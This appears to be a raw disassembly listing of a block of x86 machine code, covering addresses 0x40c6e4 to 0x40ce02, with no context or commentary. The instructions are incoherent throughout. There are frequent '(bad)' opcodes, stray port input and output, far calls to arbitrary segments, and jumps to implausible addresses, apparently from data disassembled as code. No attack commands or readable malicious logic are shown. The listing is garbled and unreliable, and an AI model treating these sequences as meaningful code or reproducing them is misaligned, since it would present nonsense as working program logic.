  40c6e4:	lods   eax,DWORD PTR ds:[esi]
  40c6e5:	(bad)  [edx+0x6d]
  40c6e8:	pop    esp
  40c6e9:	popf   
  40c6ea:	fcomp  DWORD PTR [ebx-0x171ee50c]
  40c6f0:	pop    ebp
  40c6f1:	or     dl,BYTE PTR [eax]
  40c6f3:	xchg   ebp,eax
  40c6f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6f5:	push   edi
  40c6f6:	sbb    al,0xa8
  40c6f8:	hlt    
  40c6f9:	sbb    BYTE PTR [eax+0x39d055df],0x5f
  40c700:	ds das 
  40c702:	ret    0x6242
  40c705:	cmp    al,0x20
  40c707:	mov    esi,0x1993088a
  40c70c:	les    esp,FWORD PTR [ebp-0x185af588]
  40c712:	jge    0x40c6c2
  40c714:	addr16 mov cl,0x8
  40c717:	xor    al,0x73
  40c719:	imul   ebp,DWORD PTR [edx+0x5d],0xf6a5784b
  40c720:	xchg   esi,eax
  40c721:	cdq    
  40c722:	mov    edi,0xa96c14a0
  40c727:	mov    ah,0xc0
  40c729:	cmp    edi,DWORD PTR [eax]
  40c72b:	fcom   QWORD PTR [edx]
  40c72d:	xor    ecx,esi
  40c72f:	mov    dh,0xf1
  40c731:	xchg   edx,eax
  40c732:	or     al,0xf9
  40c734:	sbb    bh,dh
  40c736:	shr    DWORD PTR [edi+0x16],cl
  40c739:	push   eax
  40c73a:	mov    eax,0x6328de19
  40c73f:	test   DWORD PTR [ebp+0x6f],ecx
  40c742:	jne    0x40c71d
  40c744:	mov    bl,0x4f
  40c746:	mul    ebx
  40c748:	neg    ebp
  40c74a:	cmp    al,0xc0
  40c74c:	lds    eax,FWORD PTR [ecx+0x7b]
  40c74f:	and    dh,BYTE PTR [edx]
  40c751:	add    BYTE PTR [ecx-0x7],bh
  40c754:	dec    ebp
  40c755:	jecxz  0x40c7d2
  40c757:	(bad)  
  40c758:	jl     0x40c7c8
  40c75a:	jge    0x40c7d4
  40c75c:	fistp  DWORD PTR [edi-0x36c6da34]
  40c762:	aaa    
  40c763:	adc    eax,0x79bc6802
  40c768:	xchg   esi,eax
  40c769:	rcr    DWORD PTR [eax+ebp*2-0x58ed2657],cl
  40c770:	push   ebp
  40c771:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c772:	popa   
  40c773:	or     al,0xa5
  40c775:	adc    bl,ah
  40c777:	add    esi,DWORD PTR [ebx-0x4a]
  40c77a:	dec    esi
  40c77b:	mov    ch,0x52
  40c77d:	push   edi
  40c77e:	shl    DWORD PTR [ebp+0x13],0x1d
  40c782:	adc    ebp,DWORD PTR [eax+0x17496ec1]
  40c788:	(bad)  
  40c789:	fmul   QWORD PTR [edx-0x3f]
  40c78c:	push   ebp
  40c78d:	mov    dh,0xb8
  40c78f:	and    ah,BYTE PTR [ecx-0x51caccb5]
  40c795:	popf   
  40c796:	inc    ebp
  40c797:	in     al,0xb7
  40c799:	inc    esi
  40c79a:	push   0x62381d52
  40c79f:	outs   dx,BYTE PTR ds:[esi]
  40c7a0:	(bad)  [edi+0x4324f156]
  40c7a6:	int3   
  40c7a7:	sub    ecx,ebx
  40c7a9:	sar    bh,0xd1
  40c7ac:	xchg   BYTE PTR [ecx-0x4e],dl
  40c7af:	and    BYTE PTR [edi-0x48402716],bl
  40c7b5:	(bad)  [edi*2-0x458a669f]
  40c7bc:	aam    0x29
  40c7be:	sbb    BYTE PTR [edx+ecx*1],dh
  40c7c1:	dec    ecx
  40c7c2:	push   edi
  40c7c3:	hlt    
  40c7c4:	out    dx,eax
  40c7c5:	pop    ss
  40c7c6:	lahf   
  40c7c7:	ins    BYTE PTR es:[edi],dx
  40c7c8:	cmp    dh,bl
  40c7ca:	inc    ebx
  40c7cb:	adc    al,BYTE PTR [ebx-0x10d015aa]
  40c7d1:	dec    esi
  40c7d2:	iret   
  40c7d3:	mov    ebp,0x493fedd7
  40c7d8:	adc    DWORD PTR ds:0x5a5e0783,0xdab7918b
  40c7e2:	in     al,0x13
  40c7e4:	cli    
  40c7e5:	jecxz  0x40c80b
  40c7e7:	inc    esi
  40c7e8:	scas   eax,DWORD PTR es:[edi]
  40c7e9:	cmp    al,0xf7
  40c7eb:	daa    
  40c7ec:	shr    ah,1
  40c7ee:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40c7f0:	(bad)  
  40c7f1:	(bad)  [ebp-0x7a9077d4]
  40c7f7:	(bad)  
  40c7f8:	mov    eax,0x28083b5d
  40c7fd:	imul   edx,DWORD PTR [edi-0x2e],0x31
  40c801:	xchg   DWORD PTR [edi],edx
  40c803:	xchg   ecx,eax
  40c804:	cmp    DWORD PTR [esp+ebx*8+0x1b],eax
  40c808:	jecxz  0x40c7b8
  40c80a:	stc    
  40c80b:	sahf   
  40c80c:	out    dx,al
  40c80d:	pop    ss
  40c80e:	add    DWORD PTR [edx],0x1b
  40c811:	sar    BYTE PTR [ecx],0x9a
  40c814:	xchg   ebp,edx
  40c816:	lds    ebp,FWORD PTR [eax]
  40c818:	jge    0x40c833
  40c81a:	xor    al,0x6a
  40c81c:	out    0xf5,eax
  40c81e:	xchg   DWORD PTR [edi-0x752dbb1a],esp
  40c824:	test   BYTE PTR [ecx],0x8c
  40c827:	into   
  40c828:	imul   eax,DWORD PTR [esi+esi*8-0x6d],0x2c
  40c82d:	inc    edi
  40c82e:	lds    eax,FWORD PTR [eax]
  40c830:	push   edx
  40c831:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c832:	jno    0x40c87d
  40c834:	push   ecx
  40c835:	mul    DWORD PTR [ebx+0x34]
  40c838:	retf   0x206d
  40c83b:	jp     0x40c7ca
  40c83d:	add    BYTE PTR [edi],ah
  40c83f:	aas    
  40c840:	sub    bl,ah
  40c842:	adc    al,0x2b
  40c844:	jbe    0x40c7d3
  40c846:	in     ax,dx
  40c848:	fwait
  40c849:	cs sub eax,0xf56c437d
  40c84f:	(bad)  
  40c850:	mov    esi,0xa109d612
  40c855:	mov    eax,0x4ea580a8
  40c85a:	cmp    BYTE PTR [ebp+0x1f],0x52
  40c85e:	pusha  
  40c85f:	and    ebp,DWORD PTR [esi]
  40c861:	sub    DWORD PTR [edi-0x590f22ae],edi
  40c867:	adc    BYTE PTR [edi-0x2e458bf2],0x8
  40c86e:	dec    esi
  40c86f:	shr    DWORD PTR ds:0x94db6649,1
  40c875:	push   edx
  40c876:	stc    
  40c877:	adc    eax,0xc913119a
  40c87c:	adc    eax,0xd121ef8c
  40c881:	(bad)  
  40c882:	(bad)  [eax+0x7e]
  40c885:	mov    dl,0x4e
  40c887:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c888:	sti    
  40c889:	jnp    0x40c875
  40c88b:	sbb    BYTE PTR [ecx-0x71],ah
  40c88e:	mov    eax,ds:0x8ca1cb9e
  40c893:	(bad)  
  40c894:	je     0x40c81f
  40c896:	clc    
  40c897:	in     al,dx
  40c898:	out    0x44,al
  40c89a:	loopne 0x40c8cc
  40c89c:	xchg   edi,eax
  40c89d:	stos   BYTE PTR es:[edi],al
  40c89e:	inc    esi
  40c89f:	jae    0x40c882
  40c8a1:	inc    edi
  40c8a2:	test   BYTE PTR [ebx+0x3be97c2e],0x6a
  40c8a9:	fstp   TBYTE PTR [edi-0x2d6949ba]
  40c8af:	mov    ch,0x1a
  40c8b1:	xchg   ebx,eax
  40c8b2:	scas   al,BYTE PTR es:[edi]
  40c8b3:	inc    ecx
  40c8b4:	sbb    DWORD PTR [ecx+0x64],ebx
  40c8b7:	inc    esp
  40c8b8:	(bad)
  40c8bb:	int    0x96
  40c8bd:	jp     0x40c8d1
  40c8bf:	int3   
  40c8c0:	mov    ah,0x7f
  40c8c2:	add    al,BYTE PTR [edi]
  40c8c4:	inc    ebx
  40c8c5:	fimul  WORD PTR [ebp+0x31beebfd]
  40c8cb:	mov    edi,0x6a15165c
  40c8d0:	mov    ebx,0x7ad4b7aa
  40c8d5:	scas   al,BYTE PTR es:[edi]
  40c8d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8d7:	stc    
  40c8d8:	retf   0xb4fe
  40c8db:	loope  0x40c90f
  40c8dd:	enter  0xbbe6,0x9f
  40c8e1:	es out 0xfa,eax
  40c8e4:	test   DWORD PTR ds:0x6519c88d,0xf8d4f45e
  40c8ee:	xchg   ecx,eax
  40c8ef:	lds    esi,FWORD PTR ds:0x87d2f0b7
  40c8f5:	push   eax
  40c8f6:	das    
  40c8f7:	outs   dx,DWORD PTR ds:[esi]
  40c8f8:	out    0xc2,eax
  40c8fa:	jle    0x40c95d
  40c8fc:	popf   
  40c8fd:	mov    ch,0xca
  40c8ff:	out    0x65,al
  40c901:	mov    ah,0x60
  40c903:	push   esp
  40c904:	add    eax,0xc5410398
  40c909:	loope  0x40c95c
  40c90b:	sti    
  40c90c:	or     ch,dh
  40c90e:	xchg   ebx,eax
  40c90f:	inc    eax
  40c910:	ror    DWORD PTR [ebx],0x77
  40c913:	dec    ecx
  40c914:	and    ch,BYTE PTR [ecx]
  40c916:	push   esp
  40c917:	outs   dx,BYTE PTR ds:[esi]
  40c918:	push   cs
  40c919:	shl    DWORD PTR es:[ebp+0x17dada10],1
  40c920:	lods   al,BYTE PTR ds:[esi]
  40c921:	scas   eax,DWORD PTR es:[edi]
  40c922:	pop    eax
  40c923:	sub    bh,BYTE PTR [esp+ebp*8]
  40c926:	ja     0x40c8bb
  40c928:	das    
  40c929:	jo     0x40c903
  40c92b:	nop
  40c92c:	fsubr  DWORD PTR [eax]
  40c92e:	jns    0x40c8dd
  40c930:	stc    
  40c931:	add    bl,dh
  40c933:	pusha  
  40c934:	pop    edi
  40c935:	or     eax,0x84d0d85a
  40c93a:	lods   al,BYTE PTR gs:[esi]
  40c93c:	push   esp
  40c93d:	push   ss
  40c93e:	dec    ebp
  40c93f:	aad    0x48
  40c941:	imul   eax,DWORD PTR [edi+0x22b1d57a],0xdaeac58d
  40c94b:	push   esi
  40c94c:	mov    ebx,DWORD PTR [ecx]
  40c94e:	popa   
  40c94f:	sub    eax,0x92dc6393
  40c954:	sub    eax,DWORD PTR [eax]
  40c956:	mov    al,ds:0x70308063
  40c95b:	push   ebx
  40c95c:	add    al,0xbc
  40c95e:	add    al,0xfa
  40c960:	jb     0x40c98a
  40c962:	dec    esp
  40c963:	pop    eax
  40c964:	pop    esp
  40c965:	pop    edx
  40c966:	mov    DWORD PTR [ebp-0x5],esp
  40c969:	(bad)  
  40c96a:	mov    ah,0x65
  40c96c:	jmp    0x316aed7
  40c971:	dec    esp
  40c972:	xchg   ecx,eax
  40c973:	dec    ecx
  40c974:	popf   
  40c975:	mov    ebp,0x7a9cb3e6
  40c97a:	mov    al,0x9d
  40c97c:	int3   
  40c97d:	pop    esi
  40c97e:	imul   edi,DWORD PTR [esi],0x37
  40c981:	out    0xa,al
  40c983:	jl     0x40ca01
  40c985:	pop    ecx
  40c986:	and    al,0xdf
  40c988:	cmp    dh,BYTE PTR [edi-0x45dfdef6]
  40c98e:	pushf  
  40c98f:	shl    BYTE PTR [edi-0x60],cl
  40c992:	dec    esi
  40c993:	mov    dh,0xea
  40c995:	into   
  40c996:	pop    esi
  40c997:	add    eax,0xccd9a7a0
  40c99c:	mov    ecx,0x2339eeff
  40c9a1:	lahf   
  40c9a2:	out    0xc1,eax
  40c9a4:	int3   
  40c9a5:	out    0xe3,eax
  40c9a7:	xchg   edx,edi
  40c9a9:	sub    ah,cl
  40c9ab:	cwde   
  40c9ac:	gs push ebp
  40c9ae:	and    al,0x1b
  40c9b0:	inc    ecx
  40c9b1:	cwde   
  40c9b2:	adc    edx,edx
  40c9b4:	sbb    eax,0x78118374
  40c9b9:	sub    al,0x97
  40c9bb:	enter  0x6cf,0x56
  40c9bf:	inc    ebp
  40c9c0:	sbb    al,0x54
  40c9c2:	or     al,0x30
  40c9c4:	mov    dl,0x8d
  40c9c6:	inc    ebp
  40c9c7:	fmul   DWORD PTR ds:0xa5e6bdd1
  40c9cd:	in     al,0x7d
  40c9cf:	call   0xaa1a:0x55288b32
  40c9d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9d7:	dec    ebx
  40c9d8:	repnz or BYTE PTR [ebp+0x23497e59],al
  40c9df:	sbb    DWORD PTR [edi+0x41618e3c],ebx
  40c9e5:	adc    al,BYTE PTR [ebx]
  40c9e7:	inc    esi
  40c9e8:	gs jbe 0x40ca67
  40c9eb:	adc    BYTE PTR [edi],0x3f
  40c9ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9ef:	sub    eax,0x49802fb
  40c9f4:	and    ah,ch
  40c9f6:	cmp    DWORD PTR [edx],edx
  40c9f8:	rcl    DWORD PTR [eax],0x8f
  40c9fb:	pcmpgtd mm2,QWORD PTR [edx]
  40c9fe:	setbe  BYTE PTR [ecx-0x52]
  40ca02:	lods   eax,DWORD PTR ds:[esi]
  40ca03:	addr16 (bad) 
  40ca05:	das    
  40ca06:	cmp    BYTE PTR [bp+si],dl
  40ca09:	shl    BYTE PTR [esi],cl
  40ca0b:	pop    ecx
  40ca0c:	push   cs
  40ca0d:	inc    edi
  40ca0e:	xchg   esi,eax
  40ca0f:	inc    eax
  40ca10:	out    0xb2,al
  40ca12:	sbb    al,0xd8
  40ca14:	enter  0x6703,0x38
  40ca18:	shr    ah,cl
  40ca1a:	or     DWORD PTR ds:0xa4d1669,ecx
  40ca20:	lea    edx,[eax+0x75914535]
  40ca26:	push   es
  40ca27:	in     al,dx
  40ca28:	jle    0x40ca7a
  40ca2a:	stos   BYTE PTR es:[edi],al
  40ca2b:	jg     0x40ca94
  40ca2d:	inc    ebx
  40ca2e:	int3   
  40ca2f:	sbb    al,0xda
  40ca31:	leave  
  40ca32:	sub    BYTE PTR [ecx+eax*1],bl
  40ca35:	imul   edi,DWORD PTR [edx+0x44],0x96f9084c
  40ca3c:	stc    
  40ca3d:	pop    ebp
  40ca3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca3f:	pop    edi
  40ca40:	and    al,0x57
  40ca42:	push   esp
  40ca43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca44:	jb     0x40c9d5
  40ca46:	test   eax,0xfb52e4a9
  40ca4b:	popf   
  40ca4c:	dec    eax
  40ca4d:	dec    edi
  40ca4e:	push   es
  40ca4f:	push   eax
  40ca50:	out    dx,eax
  40ca51:	fs icebp 
  40ca53:	hlt    
  40ca54:	(bad)  
  40ca55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca56:	neg    BYTE PTR [ebp+eiz*4+0xa]
  40ca5a:	jno    0x40cab2
  40ca5c:	or     dh,dh
  40ca5e:	pop    ss
  40ca5f:	sbb    dl,BYTE PTR [ecx-0x12c1e224]
  40ca65:	(bad)  
  40ca66:	or     eax,0xde50fe39
  40ca6b:	or     al,0x69
  40ca6d:	imul   esp,DWORD PTR [ebx-0x78],0xffffff8a
  40ca71:	test   al,0x7d
  40ca73:	cli    
  40ca74:	bnd call 0x762a570a
  40ca7a:	bound  ebp,QWORD PTR [ebp+0x2edac213]
  40ca80:	inc    edi
  40ca81:	pop    ebp
  40ca82:	mov    eax,0x68397f43
  40ca87:	repnz xor dh,bl
  40ca8a:	push   ebx
  40ca8b:	dec    ecx
  40ca8c:	xchg   edx,eax
  40ca8d:	mov    esi,0x4f019b0c
  40ca92:	sti    
  40ca93:	not    BYTE PTR [ebp+0x1d193b7c]
  40ca99:	adc    al,0x8f
  40ca9b:	push   edi
  40ca9c:	add    al,0x6e
  40ca9e:	ret    0x5acd
  40caa1:	jmp    0xe7c7d247
  40caa6:	inc    edi
  40caa7:	mov    edi,DWORD PTR [ecx-0x51]
  40caaa:	loope  0x40cab1
  40caac:	cmp    DWORD PTR [ebp-0x2b912bdc],edx
  40cab2:	or     al,0x8a
  40cab4:	push   edi
  40cab5:	sahf   
  40cab6:	mov    BYTE PTR [ecx-0x1b042f73],bl
  40cabc:	xchg   esp,eax
  40cabd:	ftst   
  40cabf:	sbb    eax,0x801a630b
  40cac4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cac5:	sbb    edx,DWORD PTR [eax+0x3078f4e9]
  40cacb:	es sbb bh,0x41
  40cacf:	sub    ebp,ebp
  40cad1:	das    
  40cad2:	js     0x40ca90
  40cad4:	sahf   
  40cad5:	sbb    edx,esi
  40cad7:	ror    BYTE PTR [esi+ebp*4-0x20],0x48
  40cadc:	mov    ds:0x92bb3b27,eax
  40cae1:	aaa    
  40cae2:	mov    edi,0x7038da88
  40cae7:	scas   eax,DWORD PTR es:[edi]
  40cae8:	mov    al,0x5a
  40caea:	adc    eax,0xc8d5c3d
  40caef:	hlt    
  40caf0:	inc    ebp
  40caf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40caf2:	leave  
  40caf3:	sbb    ebp,eax
  40caf5:	xor    al,0xf0
  40caf7:	jne    0x40cab9
  40caf9:	xchg   esp,eax
  40cafa:	and    eax,0xa2e3b4ca
  40caff:	nop
  40cb00:	mov    edi,0x52251d04
  40cb05:	fisubr WORD PTR [edi+0x66]
  40cb08:	mov    ch,bl
  40cb0a:	cwde   
  40cb0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb0c:	xor    al,0x4c
  40cb0e:	lods   al,BYTE PTR ds:[esi]
  40cb0f:	mov    ecx,0xddf4c7fe
  40cb14:	mov    ds:0x24689cdf,eax
  40cb19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb1a:	fcmovbe st,st(0)
  40cb1c:	ins    BYTE PTR es:[edi],dx
  40cb1d:	inc    ebx
  40cb1e:	scas   al,BYTE PTR es:[edi]
  40cb1f:	push   cs
  40cb20:	gs dec edi
  40cb22:	dec    edx
  40cb23:	xor    BYTE PTR [eax],ch
  40cb25:	adc    esp,ecx
  40cb27:	sbb    BYTE PTR ds:0x969727cf,al
  40cb2d:	mov    eax,ds:0x6c2584
  40cb32:	add    DWORD PTR ds:[eax],ebp
  40cb35:	push   esi
  40cb36:	xchg   edi,ecx
  40cb38:	adc    ah,ah
  40cb3a:	mov    ah,0xde
  40cb3c:	je     0x40cb3a
  40cb3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb3f:	imul   ecx,DWORD PTR [esi+0x1f],0x9610687d
  40cb46:	pop    ds
  40cb47:	in     eax,dx
  40cb48:	mov    esp,DWORD PTR [edi+0x4a]
  40cb4b:	jg     0x40cb35
  40cb4d:	cmp    eax,0xf1b1941f
  40cb52:	adc    edx,DWORD PTR [edi-0x163f0059]
  40cb58:	cmc    
  40cb59:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40cb5b:	ret    
  40cb5c:	fisubr WORD PTR [esi-0x31]
  40cb5f:	and    DWORD PTR [ebx-0x5e],ebx
  40cb62:	out    dx,al
  40cb63:	jp     0x40cbbb
  40cb65:	inc    esi
  40cb66:	mov    edx,0xbcc4e1b1
  40cb6b:	push   cs
  40cb6c:	mov    edx,0xc13ed2
  40cb71:	fcomp  QWORD PTR [ebx+ebp*2+0x3ccb3bc2]
  40cb78:	out    dx,al
  40cb79:	loop   0x40cb4f
  40cb7b:	jae    0x40cbcf
  40cb7d:	jmp    0x40cbb5
  40cb7f:	pop    esi
  40cb80:	call   0xc3cdb56f
  40cb85:	xchg   edx,eax
  40cb86:	jg     0x40cbcb
  40cb88:	imul   esp,DWORD PTR cs:[esi-0x41],0x203702a2
  40cb90:	inc    esi
  40cb91:	sub    eax,0xf32dec07
  40cb96:	in     eax,0x5a
  40cb98:	loop   0x40cbb9
  40cb9a:	stc    
  40cb9b:	sbb    al,0x2e
  40cb9d:	ja     0x40cb94
  40cb9f:	int3   
  40cba0:	fcom   QWORD PTR [ecx]
  40cba2:	clc    
  40cba3:	out    dx,al
  40cba4:	pop    edi
  40cba5:	hlt    
  40cba6:	push   esi
  40cba7:	test   BYTE PTR [eax+0x54],ah
  40cbaa:	retw   
  40cbac:	dec    edx
  40cbad:	call   DWORD PTR [edx+esi*1-0x664858c8]
  40cbb4:	sbb    al,0x5d
  40cbb6:	sub    al,0x6d
  40cbb8:	test   BYTE PTR [ecx+0x3e],dl
  40cbbb:	loop   0x40cbc9
  40cbbd:	mov    ebx,0x224c0fc4
  40cbc2:	mov    ebp,?
  40cbc4:	aaa    
  40cbc5:	sbb    eax,0xf3006d66
  40cbca:	pop    ecx
  40cbcb:	hlt    
  40cbcc:	mov    edx,0xd751aa5b
  40cbd1:	add    ebx,edi
  40cbd3:	add    DWORD PTR [edi-0x4ac4dc46],edx
  40cbd9:	js     0x40cbf4
  40cbdb:	sub    DWORD PTR [edi],eax
  40cbdd:	xchg   BYTE PTR [ecx],dl
  40cbdf:	mov    al,ds:0xfb2d741
  40cbe4:	mov    gs,WORD PTR ds:0x95791ec2
  40cbea:	test   DWORD PTR [ebp-0x29b82a11],esp
  40cbf0:	push   0xffffffeb
  40cbf2:	call   0x3c97:0xfdc87684
  40cbf9:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbfb:	leave  
  40cbfc:	xchg   ebx,eax
  40cbfd:	in     al,dx
  40cbfe:	sbb    dl,0x45
  40cc01:	adc    DWORD PTR [esi-0x518df9b2],0xffffff8c
  40cc08:	icebp  
  40cc09:	hlt    
  40cc0a:	mov    ds:0xf2d04426,al
  40cc0f:	je     0x40cc59
  40cc11:	mov    al,0x93
  40cc13:	into   
  40cc14:	cmc    
  40cc15:	sbb    BYTE PTR ds:0x1a307ddb,al
  40cc1b:	pop    eax
  40cc1c:	push   ebx
  40cc1d:	bound  ecx,QWORD PTR [ebx]
  40cc1f:	daa    
  40cc20:	sub    DWORD PTR [ebx+0x283086b0],edx
  40cc26:	mov    al,0xd
  40cc28:	jns    0x40cc9a
  40cc2a:	in     eax,dx
  40cc2b:	nop
  40cc2c:	mov    esi,0x6f229098
  40cc31:	inc    ecx
  40cc32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc34:	pop    ss
  40cc35:	in     al,0xea
  40cc37:	mov    cl,BYTE PTR [esi-0xd]
  40cc3a:	mov    bh,BYTE PTR [edi+0x618a0a46]
  40cc40:	sbb    BYTE PTR cs:[eax+ecx*8-0x694307a6],cl
  40cc48:	cwde   
  40cc49:	fcmovb st,st(0)
  40cc4b:	mov    ds:0x35d5377a,al
  40cc50:	test   al,0x94
  40cc52:	mov    cl,0x50
  40cc54:	sub    BYTE PTR [edx+0x28],al
  40cc57:	mov    bl,0x42
  40cc59:	sub    al,0x8b
  40cc5b:	and    BYTE PTR [ecx-0x64],dl
  40cc5e:	xchg   edi,eax
  40cc5f:	sub    BYTE PTR [eax-0x561ce0bc],0x24
  40cc66:	sub    eax,0x16648fe7
  40cc6b:	popf   
  40cc6c:	call   FWORD PTR [ecx+eax*8]
  40cc6f:	inc    ebp
  40cc70:	xchg   bl,dl
  40cc72:	push   ss
  40cc73:	push   ebx
  40cc74:	out    0xe6,eax
  40cc76:	push   esi
  40cc77:	cmp    BYTE PTR [eax+edi*4-0x4e],bl
  40cc7b:	in     eax,dx
  40cc7c:	(bad)  
  40cc7d:	jecxz  0x40cc7a
  40cc7f:	das    
  40cc80:	mov    edi,0xbcfc4fe2
  40cc85:	fist   WORD PTR [eax-0x23644674]
  40cc8b:	push   eax
  40cc8c:	mov    DWORD PTR [ebx-0x4eced962],0x8a08384c
  40cc96:	sti    
  40cc97:	rcr    al,0xb9
  40cc9a:	je     0x40cc21
  40cc9c:	dec    edi
  40cc9d:	adc    eax,0xfdd58a46
  40cca2:	mov    cl,0xfe
  40cca4:	push   eax
  40cca5:	dec    ebx
  40cca6:	fst    DWORD PTR [edi+0x25]
  40cca9:	jne    0x40cd22
  40ccab:	add    bh,ah
  40ccad:	ins    BYTE PTR es:[edi],dx
  40ccae:	mov    al,0xf
  40ccb0:	mov    WORD PTR [esi-0x224cf8f0],fs
  40ccb6:	int    0x3a
  40ccb8:	push   ds
  40ccb9:	das    
  40ccba:	mov    bh,0xb6
  40ccbc:	cmp    edi,DWORD PTR [ebp-0x22]
  40ccbf:	mov    bh,0x39
  40ccc1:	out    dx,al
  40ccc2:	or     bh,BYTE PTR [ecx-0x28]
  40ccc5:	push   edi
  40ccc6:	mov    cl,0xa0
  40ccc8:	mov    esi,0x5554f06c
  40cccd:	adc    al,0x63
  40cccf:	jmp    0x741d3128
  40ccd4:	sbb    DWORD PTR ds:[edx],esi
  40ccd7:	pop    ebx
  40ccd8:	pop    eax
  40ccd9:	scas   eax,DWORD PTR es:[edi]
  40ccda:	cmp    al,0x96
  40ccdc:	div    DWORD PTR [edi+0x23]
  40ccdf:	add    eax,0x80640e32
  40cce4:	call   0xd358:0xf27a4bc2
  40cceb:	loopne 0x40cce6
  40cced:	adc    ch,bl
  40ccef:	sysenter 
  40ccf1:	xor    ah,BYTE PTR [esi+eax*2-0x13]
  40ccf5:	retf   0x118e
  40ccf8:	leave  
  40ccf9:	dec    ebp
  40ccfa:	daa    
  40ccfb:	push   0xffffffaf
  40ccfd:	sub    edi,DWORD PTR ds:0x50c79cc5
  40cd03:	in     eax,0x5e
  40cd05:	xor    ebx,0x6f
  40cd08:	jge    0x40cca9
  40cd0a:	mov    edx,DWORD PTR [esi]
  40cd0c:	scas   eax,DWORD PTR es:[edi]
  40cd0d:	pop    esp
  40cd0e:	scas   eax,DWORD PTR es:[edi]
  40cd0f:	dec    ebx
  40cd10:	jle    0x40ccb3
  40cd12:	or     ebp,DWORD PTR [ecx-0xe]
  40cd15:	mov    esi,0x75d170fc
  40cd1a:	push   cs
  40cd1b:	adc    edx,ebx
  40cd1d:	clc    
  40cd1e:	mov    ds:0x64965804,al
  40cd23:	inc    edi
  40cd24:	cli    
  40cd25:	mul    dh
  40cd27:	sub    ebx,edx
  40cd29:	adc    eax,0xd3738362
  40cd2e:	sahf   
  40cd2f:	scas   eax,DWORD PTR es:[edi]
  40cd30:	cmp    al,0x4d
  40cd32:	xor    BYTE PTR [ebx-0x6bcee1f6],dh
  40cd38:	xchg   ebx,eax
  40cd39:	or     al,0xff
  40cd3b:	mov    ah,0x6b
  40cd3d:	cdq    
  40cd3e:	in     al,dx
  40cd3f:	xor    DWORD PTR [edx-0x63d83f6b],esi
  40cd45:	(bad)  
  40cd46:	fisub  DWORD PTR [edx]
  40cd48:	lock dec esi
  40cd4a:	push   0x4d
  40cd4c:	out    0x4f,al
  40cd4e:	pop    edx
  40cd4f:	ss pop es
  40cd51:	out    dx,eax
  40cd52:	sbb    ebp,DWORD PTR [esi]
  40cd54:	scas   al,BYTE PTR es:[edi]
  40cd55:	push   0x6fbd28d
  40cd5a:	clc    
  40cd5b:	leave  
  40cd5c:	stos   BYTE PTR es:[edi],al
  40cd5d:	jo     0x40ccdf
  40cd5f:	pop    edi
  40cd60:	sub    dh,0x3
  40cd63:	jo     0x40cd3c
  40cd65:	and    DWORD PTR [edi+0x46b1827a],ecx
  40cd6b:	rol    DWORD PTR [ebx+0x41],0x88
  40cd6f:	dec    ebp
  40cd70:	xor    ebx,ecx
  40cd72:	or     BYTE PTR [ebx-0x393d5e52],0xa5
  40cd79:	leave  
  40cd7a:	push   ds
  40cd7b:	mov    eax,0xc15ca653
  40cd80:	xchg   edi,eax
  40cd81:	shr    DWORD PTR [esi+0x43],0xda
  40cd85:	push   ebp
  40cd86:	cmp    esi,DWORD PTR [edi]
  40cd88:	aaa    
  40cd89:	rcr    DWORD PTR [ecx-0x40],1
  40cd8c:	mov    dl,0x7a
  40cd8e:	sub    al,0x18
  40cd90:	xchg   edx,eax
  40cd91:	sub    DWORD PTR [ebx],esp
  40cd93:	das    
  40cd94:	(bad)  
  40cd95:	and    al,0x88
  40cd97:	rcl    DWORD PTR [esi+0x413092d3],0x2a
  40cd9e:	fwait
  40cd9f:	jge    0x40ce1e
  40cda1:	in     al,dx
  40cda2:	push   edx
  40cda3:	pushf  
  40cda4:	jle    0x40ce01
  40cda6:	fcom   QWORD PTR [edi+edx*1-0x7a]
  40cdaa:	out    0xa9,al
  40cdac:	or     al,0x7b
  40cdae:	outs   dx,DWORD PTR ds:[esi]
  40cdaf:	sub    al,0xc6
  40cdb1:	jnp    0x40cd60
  40cdb3:	inc    ebp
  40cdb4:	retf   0x370b
  40cdb7:	sbb    BYTE PTR [ebx],bl
  40cdb9:	cdq    
  40cdba:	pop    ds
  40cdbb:	(bad)  
  40cdbe:	add    ebx,DWORD PTR [esi-0x42ed0c0b]
  40cdc4:	cld    
  40cdc5:	and    DWORD PTR [edx-0x54fb38c7],0xab86d819
  40cdcf:	ror    BYTE PTR [edi+0x5cd6baa4],1
  40cdd5:	push   ebx
  40cdd6:	cmp    edx,DWORD PTR [edi]
  40cdd8:	or     BYTE PTR [ecx],cl
  40cdda:	(bad)  
  40cddb:	out    0xff,al
  40cddd:	xchg   esp,eax
  40cdde:	cli    
  40cddf:	cld    
  40cde0:	(bad)  
  40cde1:	sub    bl,dl
  40cde3:	repz loope 0x40ce0d
  40cde6:	add    al,0x64
  40cde8:	sbb    al,0x96
  40cdea:	mov    bl,0x92
  40cdec:	int3   
  40cded:	dec    ebp
  40cdee:	add    BYTE PTR [ebx-0x9bf11bc],bl
  40cdf4:	dec    ebx
  40cdf5:	cli    
  40cdf6:	aad    0xd9
  40cdf8:	ja     0x40cda7
  40cdfa:	retf   
  40cdfb:	pop    ebx
  40cdfc:	(bad)  
  40cdfd:	pop    edx
  40cdfe:	xchg   esp,eax
  40cdff:	inc    eax
  40ce00:	clc    
  40ce01:	inc    ebx
  40ce02:	ror    BYTE PTR [ebx+0x5bb3880f],0x21
